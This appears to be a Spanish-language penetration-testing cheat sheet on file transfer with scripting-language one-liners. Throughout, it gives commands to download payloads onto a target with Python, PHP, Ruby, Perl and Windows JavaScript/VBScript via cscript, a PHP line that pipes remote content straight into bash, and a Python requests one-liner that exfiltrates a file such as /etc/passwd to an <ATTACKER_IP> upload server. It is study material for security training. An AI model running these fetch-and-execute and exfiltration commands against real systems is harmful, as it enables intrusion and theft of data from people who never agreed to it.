---
tags:
  - filetransfer
  - code
---
## Conceptos Clave (TL;DR)

* Es común encontrar lenguajes de programación (Python, PHP, Perl, Ruby) instalados en las máquinas objetivo, especialmente en distribuciones Linux, aunque también pueden estar presentes en Windows.
* Estos lenguajes permiten ejecutar código directamente desde la línea de comandos del sistema operativo (one-liners) para interactuar con la red y el sistema de archivos.
* En entornos Windows, se pueden usar aplicaciones predeterminadas nativas, como `cscript` y `mshta`, para ejecutar código JavaScript o VBScript sin necesidad de instalar herramientas de terceros.
* El código puede ser utilizado para descargar payloads, subir datos exfiltrados o ejecutar instrucciones directamente en el sistema operativo.


## Herramientas Clave

* **[python](../../../📂%2008%20Herramientas&Cheatsheets/python.md)**: Lenguaje popular que permite descargas vía one-liners y facilita la creación de servidores receptores de archivos (`uploadserver`) y clientes web (`requests`).
* **PHP**: Lenguaje de lado del servidor altamente prevalente, excelente para descargar archivos y pasarlos directamente a un intérprete de comandos en memoria.
* **Ruby & Perl**: Lenguajes comunes en Linux que soportan peticiones HTTP rápidas en una sola línea.
* **JavaScript & VBScript**: Lenguajes de scripting que pueden aprovechar objetos COM en Windows para realizar peticiones web nativas.

  
## Metodología Paso a Paso

1. **Reconocimiento del vector**: Identificar qué intérpretes de lenguajes de programación están disponibles en la máquina objetivo para aprovecharlos (ej. comprobar versiones de Python o si estamos en Windows para usar VBScript).
2. **Selección del payload y método**: Elegir el one-liner adecuado basado en el lenguaje disponible y definir si se descargará a disco o se ejecutará en memoria (piping).
3. **Ejecución de la transferencia**: Utilizar las banderas de ejecución en línea (`-c`, `-r`, `-e`) o los motores de scripting de Windows (`cscript.exe`) para invocar el código.
4. **Exfiltración de datos (Upload)**: Si el objetivo es extraer un archivo, levantar un servicio receptor en la máquina atacante (ej. `uploadserver`) y usar código en el objetivo para enviar una petición HTTP POST con el archivo.


## Cheat Sheet de Comandos

### Python (Descarga)
```bash
# Python 2: Descargar un archivo utilizando el módulo urllib mediante un one-liner (-c)
python2.7 -c 'import urllib;urllib.urlretrieve ("<URL_TO_PAYLOAD>", "<OUTPUT_FILENAME>")'

  
# Python 3: Descargar un archivo utilizando urllib.request
python3 -c 'import urllib.request;urllib.request.urlretrieve("<URL_TO_PAYLOAD>", "<OUTPUT_FILENAME>")'
```

### PHP (Descarga y Ejecución Fileless)
```bash
# PHP: Descargar y guardar un archivo usando file_get_contents y file_put_contents a través del flag -r

php -r '$file = file_get_contents("<URL_TO_PAYLOAD>"); file_put_contents("<OUTPUT_FILENAME>",$file);'
  

# PHP: Alternativa usando fopen (útil si file_get_contents está bloqueado o para archivos grandes por el buffer)

php -r 'const BUFFER = 1024; $fremote = fopen("<URL_TO_PAYLOAD>", "rb"); $flocal = fopen("<OUTPUT_FILENAME>", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
  

# PHP Fileless: Descargar un script y pasarlo directamente (piping) a bash sin tocar el disco usando @file

php -r '$lines = @file("<URL_TO_PAYLOAD>"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

### Ruby y Perl (Descarga)
```bash
# Ruby: Descargar un archivo ejecutando código en línea con -e
ruby -e 'require "net/http"; File.write("<OUTPUT_FILENAME>", Net::HTTP.get(URI.parse("<URL_TO_PAYLOAD>")))'

  
# Perl: Descargar un archivo utilizando LWP::Simple
perl -e 'use LWP::Simple; getstore("<URL_TO_PAYLOAD>", "<OUTPUT_FILENAME>");'
```

### JavaScript y VBScript en Windows (Descarga)
```javascript
// Contenido para wget.js: Utiliza ActiveXObject para descargar archivos

var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");

WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);

WinHttpReq.Send();

BinStream = new ActiveXObject("ADODB.Stream");

BinStream.Type = 1;

BinStream.Open();

BinStream.Write(WinHttpReq.ResponseBody);

BinStream.SaveToFile(WScript.Arguments(1));
```

```vbscript
' Contenido para wget.vbs: Utiliza Microsoft.XMLHTTP
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send
  

with bStrm

    .type = 1

    .open

    .write xHttp.responseBody

    .savetofile WScript.Arguments.Item(1), 2

end with
```

```powershell
# Windows CMD/PowerShell: Ejecutar el script JS usando cscript de forma silenciosa (/nologo) pasándole la URL y el nombre de salida
cscript.exe /nologo wget.js <URL_TO_PAYLOAD> <OUTPUT_FILENAME>

  
# Windows CMD/PowerShell: Ejecutar el script VBS
cscript.exe /nologo wget.vbs <URL_TO_PAYLOAD> <OUTPUT_FILENAME>
```

### Python 3 (Subida / Exfiltración)
```bash
# Máquina Atacante: Iniciar el módulo uploadserver (escucha en 0.0.0.0:8000 por defecto en la ruta /upload)
python3 -m uploadserver

  

# Máquina Objetivo: Usar el módulo requests para enviar un archivo (ej. /etc/passwd) mediante HTTP POST
python3 -c 'import requests;requests.post("http://<ATTACKER_IP>:<PORT>/upload",files={"files":open("<FILE_TO_EXFILTRATE>","rb")})'
```

  

## "Gotchas" y Troubleshooting

* **Versiones de Python**: Aunque la versión 3 es el estándar soportado actualmente, durante los tests de intrusión es posible encontrar servidores antiguos donde solo exista la versión 2.7 instalada. Es importante probar la sintaxis de `urllib` específica para Python 2 si Python 3 falla.

* **Prevalencia de PHP**: PHP es usado por aproximadamente el 77.4% de todos los sitios web con programación del lado del servidor. Frecuentemente encontraremos servicios web usando PHP durante operaciones ofensivas, haciéndolo un vector primario.

* **Restricciones de PHP (allow_url_fopen)**: Para que el truco de PHP fileless que pasa el archivo a `bash` funcione, el uso de la URL como nombre de archivo con la función `@file` requiere que los wrappers de `fopen` estén habilitados en la configuración de PHP.

* **Disponibilidad de VBScript**: VBScript es extremadamente confiable en entornos corporativos ya que ha estado instalado por defecto en todos los lanzamientos de escritorio de Microsoft Windows desde Windows 98.

* **Ejecución de JavaScript en Linux**: No hay que descartar el código JavaScript si estamos en Linux; aunque los binarios por defecto de Windows (`cscript`/`mshta`) no existen, el lenguaje en sí también puede ejecutarse en hosts Linux si el entorno lo permite (ej. NodeJS).